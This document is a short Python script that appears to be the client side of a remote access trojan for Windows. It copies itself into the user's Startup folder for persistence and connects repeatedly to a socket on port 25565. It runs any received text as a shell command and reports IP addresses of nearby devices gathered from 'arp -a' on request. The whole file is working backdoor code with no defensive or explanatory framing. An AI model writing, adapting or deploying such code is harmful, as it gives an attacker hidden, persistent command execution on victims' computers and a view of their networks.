import socket 
import threading
import subprocess 
import sys, os, getpass, re
from shutil import copy
class Client:
    def devices(self):
       

        self.a = str(subprocess.check_output("arp -a"))
        self.a = re.sub("\s+", " ", self.a)
        self.a = self.a.split("\\r\\n")
        self.ip = []
        for self.item in self.a:
    
            if self.item.split()[0].count(".") == 3:
                self.ip.append(self.item.split()[0])
        return self.ip
    def build(self):
        try:
            self.add_startup()
        except Exception as e:
            print(e)
        self.connect()
        threading.Thread(target=self.listen).start()
    def connect(self):
        while True:
            try:
                print("Reaching out")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((socket.gethostbyname(socket.gethostname()), 25565))
                break 
            except:
                continue 
    def add_startup(self):
        copy(__file__, f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
        print("Added to StartUp!")
    def listen(self):
        while True:
            try:
                self.data = self.socket.recv(2048).decode()
            except:
                self.socket.close()
                print("Reconnecting")
                self.connect()
                print("Reconnected!")
            if self.data == "SELF_DESTRUCT":
                sys.exit(0)
            elif self.data == "devices":
                self.socket.send(str(self.devices()).encode())
            else:
                subprocess.Popen(self.data, shell=True)
           # self.socket.sendall("200".encode())
Client().build()
